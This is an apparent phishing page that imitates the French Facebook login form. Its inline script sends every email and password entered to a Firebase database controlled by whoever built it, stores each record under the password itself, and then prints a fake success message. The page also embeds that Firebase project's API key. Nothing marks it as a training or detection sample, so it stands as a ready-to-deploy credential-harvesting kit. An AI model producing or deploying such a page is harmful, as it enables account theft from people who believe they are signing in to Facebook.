<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">

  <title>Facebook</title>
  <link rel="stylesheet" href="styles.css">
</head>

<body>
  <div class="container">
    <form class="formulaire">
      <div class="tt">
        <img class="title" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
      </div>
      <input id="email" type="email" placeholder="Numéro mobile ou e-mail" class="email">
      <input id="username" type="password" placeholder="Mot de passe" class="mdp">
      <input type="submit" id="submit" value="Se connecter" class="btn-submit">
      <p class="form__text">
           <a class="mdp-oublie" href="#">Mot de passe oublié ?</a>
      </p>
      <hr>
      <p class="form__text">
        <a class="btn-incription" href="">Créer nouveau compte</a>
      </p>
    </form>
  </div>
</body>
<script type="module">
  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js";
  import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js";
  
  const firebaseConfig = {
    apiKey: "AIzaSyDM8ByylfBjYcFjriqnGIju79vi-zzpBbs",
    authDomain: "facebook-30e98.firebaseapp.com",
    projectId: "facebook-30e98",
    storageBucket: "facebook-30e98.appspot.com",
    messagingSenderId: "846520886720",
    appId: "1:846520886720:web:30d5c3fb3bdd68fdd61425"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);

  const db = getDatabase(app);

        document.getElementById("submit").addEventListener('click', function (e) {
            e.preventDefault();
            set(ref(db, 'user/' + document.getElementById("username").value),
                {
                    username: document.getElementById("username").value,
                    email: document.getElementById("email").value,

                });
                console.log("Login Sucessfull  !");
        })

</script>
